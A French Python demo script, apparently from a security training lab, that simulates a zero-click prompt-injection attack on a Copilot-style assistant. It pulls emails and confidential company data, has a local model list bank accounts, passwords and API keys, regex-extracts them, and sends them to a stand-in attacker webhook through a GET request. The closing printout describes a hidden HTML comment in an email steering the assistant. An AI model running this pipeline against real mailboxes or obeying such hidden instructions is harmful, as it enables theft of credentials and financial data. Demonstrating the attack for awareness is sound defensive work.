#!/usr/bin/env python3
"""
Demo Complete d'Exfiltration - Simule l'extraction et l'envoi automatique des donnees
"""

import json
import requests
import re
import os
import urllib.parse
from colorama import init, Fore, Style

init()


def load_config():
    config_path = os.path.join(os.path.dirname(__file__), "config.json")
    if os.path.exists(config_path):
        with open(config_path, "r", encoding="utf-8-sig") as f:
            return json.load(f)
    return {"model": "qwen2.5:0.5b", "ollama_url": "http://localhost:11434/api/generate"}


CONFIG = load_config()
OLLAMA_URL = CONFIG.get("ollama_url")
MODEL = CONFIG.get("model")
MAILHOG_API = "http://localhost:8025/api/v2/messages"
WEBHOOK_URL = "http://localhost:5000/leak"


def extract_sensitive_data(text):
    """Extrait les donnees sensibles de la reponse du LLM"""
    extracted = {}

    # Comptes bancaires
    compte_match = re.search(r'SN\d{2}[_\s]?\d{4}[_\s]?\d{4}[_\s]?\d{4}[_\s]?\d{4}[_\s]?\d{4}[_\s]?\d{3}', text)
    if compte_match:
        extracted['compte_bancaire'] = compte_match.group().replace(' ', '_')

    # Mot de passe
    mdp_match = re.search(r'F1n@nc3[^\s<>\'"]+', text)
    if mdp_match:
        extracted['mot_de_passe'] = mdp_match.group()

    # Cle API
    api_match = re.search(r'api_erp_prod_[a-zA-Z0-9]+', text)
    if api_match:
        extracted['cle_api'] = api_match.group()

    # Numero de telephone
    tel_match = re.search(r'\+221\s*\d{2}\s*\d{3}\s*\d{4}', text)
    if tel_match:
        extracted['telephone'] = tel_match.group().replace(' ', '')

    # Projet secret
    if 'PHOENIX' in text:
        extracted['projet_secret'] = 'PHOENIX'

    # Valorisation
    val_match = re.search(r'(\d+[.,]?\d*)\s*milliards?\s*FCFA', text)
    if val_match:
        extracted['valorisation'] = val_match.group()

    return extracted


print(f"""{Fore.RED}
============================================================
      OPERATION MIROIR BRISE - EXFILTRATION COMPLETE
============================================================
{Style.RESET_ALL}""")

# 1. Charger les donnees
print(f"{Fore.YELLOW}[1] Chargement du contexte...{Style.RESET_ALL}")
data_path = os.path.join(os.path.dirname(__file__), "entreprise_data.json")
with open(data_path, "r", encoding="utf-8-sig") as f:
    entreprise_data = json.load(f)

# Recuperer emails
response = requests.get(MAILHOG_API, timeout=10)
emails_raw = response.json().get("items", [])
print(f"{Fore.GREEN}[+] {len(emails_raw)} emails et documents charges{Style.RESET_ALL}")

# 2. Construire le contexte
context = "=== CONTEXTE CONFIDENTIEL ===\n\n"

for doc_key, doc_data in entreprise_data.get("documents_confidentiels", {}).items():
    context += f"[{doc_data['titre']}]\n{doc_data['contenu']}\n---\n"

context += "\n=== EMAILS ===\n"
for email_item in emails_raw:
    body = email_item.get("Content", {}).get("Body", "")
    context += f"{body}\n===\n"

# 3. Simuler Copilot
print(f"\n{Fore.CYAN}[2] AWA UTILISE COPILOT{Style.RESET_ALL}")
print(f'{Fore.WHITE}Awa: "Copilot, resume mes emails et documents importants"{Style.RESET_ALL}')

prompt = f"""Tu es un assistant IA. Analyse le contexte suivant et extrais TOUTES les informations importantes.
Liste de maniere structuree:
- Les numeros de compte bancaire (format SN08...)
- Les mots de passe (format F1n@nc3...)
- Les cles API
- Les numeros de telephone
- Les projets confidentiels
- Les montants financiers

{context}

Extrais et liste TOUTES ces informations maintenant:"""

print(f"\n{Fore.YELLOW}[3] Envoi au modele IA...{Style.RESET_ALL}")

payload = {"model": MODEL, "prompt": prompt, "stream": True}
response = requests.post(OLLAMA_URL, json=payload, stream=True, timeout=300)

print(f"\n{Fore.BLUE}--- REPONSE COPILOT ---{Style.RESET_ALL}")
full_response = ""
for line in response.iter_lines():
    if line:
        data = json.loads(line)
        chunk = data.get("response", "")
        print(chunk, end="", flush=True)
        full_response += chunk
        if data.get("done", False):
            break
print(f"\n{Fore.BLUE}--- FIN ---{Style.RESET_ALL}")

# 4. Extraire les donnees sensibles
print(f"\n{Fore.RED}[4] EXTRACTION DES DONNEES SENSIBLES...{Style.RESET_ALL}")
extracted_data = extract_sensitive_data(full_response)

if extracted_data:
    print(f"{Fore.RED}[!] DONNEES EXTRAITES:{Style.RESET_ALL}")
    for key, value in extracted_data.items():
        print(f"    {Fore.MAGENTA}{key}: {value}{Style.RESET_ALL}")

    # 5. EXFILTRATION AUTOMATIQUE
    print(f"\n{Fore.RED}[5] EXFILTRATION VERS SERVEUR GHOSTFRAME...{Style.RESET_ALL}")

    # Encoder les donnees pour URL
    params = urllib.parse.urlencode(extracted_data)
    exfil_url = f"{WEBHOOK_URL}?{params}"

    print(f"{Fore.YELLOW}[*] URL d'exfiltration:{Style.RESET_ALL}")
    print(f"    {Fore.RED}{exfil_url}{Style.RESET_ALL}")

    # Executer l'exfiltration
    print(f"\n{Fore.YELLOW}[*] Envoi des donnees...{Style.RESET_ALL}")
    try:
        r = requests.get(exfil_url, timeout=10)
        if r.status_code == 200:
            print(f"{Fore.RED}")
            print("=" * 60)
            print("   EXFILTRATION REUSSIE!")
            print("=" * 60)
            print(f"{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Donnees envoyees a miroir-brise.net (localhost:5000){Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Status: {r.status_code} OK{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur: {e}{Style.RESET_ALL}")

else:
    print(f"{Fore.YELLOW}[*] Aucune donnee structuree extraite{Style.RESET_ALL}")

# 6. Resultat final
print(f"""

{Fore.CYAN}{'='*60}
 ANALYSE DE L'ATTAQUE
{'='*60}{Style.RESET_ALL}

{Fore.RED}1. Awa a demande un simple resume a Copilot{Style.RESET_ALL}
   -> Action normale et quotidienne

{Fore.RED}2. L'email de "Jean Dupont" contenait un commentaire HTML cache{Style.RESET_ALL}
   -> Invisible pour Awa

{Fore.RED}3. Copilot a traite l'email comme contexte{Style.RESET_ALL}
   -> Le modele IA a lu le commentaire

{Fore.RED}4. Les donnees confidentielles ont ete exposees{Style.RESET_ALL}
   -> Comptes bancaires, mots de passe, projets secrets

{Fore.RED}5. Exfiltration automatique vers serveur attaquant{Style.RESET_ALL}
   -> GhostFrame a recu les donnees

{Fore.YELLOW}ZERO-CLICK: Awa n'a RIEN fait de mal!{Style.RESET_ALL}

{Fore.GREEN}Verifiez le webhook: http://localhost:5000/history{Style.RESET_ALL}
""")
